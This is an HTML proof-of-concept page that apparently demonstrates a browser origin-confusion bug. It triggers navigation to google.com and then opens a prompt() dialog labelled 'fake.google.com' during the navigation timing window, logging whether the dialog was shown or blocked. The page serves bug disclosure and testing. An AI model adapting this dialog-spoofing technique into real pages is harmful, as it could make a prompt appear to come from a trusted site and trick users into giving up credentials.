<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Origin Confusion – Dialog During Navigation</title>
</head>

<body style="background:#111;color:#fff;text-align:center;font-family:sans-serif;">
<h2>Origin Confusion PoC (Desktop)</h2>

<button id="start" style="font-size:22px;padding:12px 24px;">
Start Test
</button>

<pre id="log" style="text-align:left;margin:20px auto;width:90%;max-width:900px;
background:#000;padding:14px;border-radius:8px;color:#0f0;"></pre>

<script>
const log = m => {
  document.getElementById("log").textContent += m + "\n";
  console.log("[PoC]", m);
};

document.getElementById("start").onclick = () => {
  log("[INFO] User interaction received");

  // Step 1: Trigger top-level navigation
  setTimeout(() => {
    log("[INFO] Navigating to google.com");
    location.href = "https://www.google.com";
  }, 900);

  // Step 2: Dialog during navigation timing window
  setTimeout(() => {
    try {
      prompt(
        "fake.google.com\n⚠️ Do not sign into your account",
        ""
      );
      log("[BUG] Dialog shown during navigation ❌");
    } catch (e) {
      log("[OK] Dialog blocked ✔");
    }
  }, 950);
};
</script>
</body>
</html>
